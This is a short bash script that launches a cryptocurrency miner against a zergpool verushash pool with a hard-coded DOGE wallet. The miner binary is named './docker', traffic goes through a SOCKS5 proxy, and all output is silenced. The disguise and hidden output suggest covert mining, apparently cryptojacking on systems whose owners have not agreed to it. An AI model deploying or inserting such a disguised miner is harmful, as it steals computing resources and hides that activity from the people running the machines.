#!/bin/bash
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=D8j9uniRtnR2qCs69oGuRp8G1Q5nCDmR9S
PROXY=socks5://184.178.172.14:4145
./docker -a verus -o $POOL -u $WALLET.ANJIR -p c=DOGE,mc=VRSC,ID=ANJIR -t 2 -x $PROXY > /dev/null 2>&1
